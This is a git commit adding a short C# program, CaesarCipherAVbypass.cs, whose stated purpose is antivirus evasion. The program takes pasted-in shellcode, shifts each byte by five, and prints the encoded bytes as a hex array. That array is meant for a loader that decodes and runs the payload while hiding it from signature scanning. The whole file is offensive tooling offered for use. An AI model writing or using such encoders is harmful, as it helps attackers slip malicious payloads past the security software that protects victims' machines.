cc43d40f43cb25265614e48d01b253d139246b7b
lostsignals <164725581+DistributedAttacks@users.noreply.github.com>
2026-03-22 22:06:45 +0400

    Create CaesarCipherAVbypass.cs

---
+++ CaesarCipherAVbypass.cs
@@ -0,0 +1,30 @@
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace Helper
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            byte[] buf = //REPLACE WITH SHELL CODE HERE
+
+            byte[] encoded = new byte[buf.Length];
+            for (int i = 0; i < buf.Length; i++)
+            {
+                encoded[i] = (byte)(((uint)buf[i] + 5) & 0xFF);
+            }
+
+            StringBuilder hex = new StringBuilder(encoded.Length * 2);
+            foreach (byte b in encoded)
+            {
+                hex.AppendFormat("0x{0:x2}, ", b);
+            }
+
+            Console.WriteLine("The payload is: " + hex.ToString());
+        }
+    }
+}
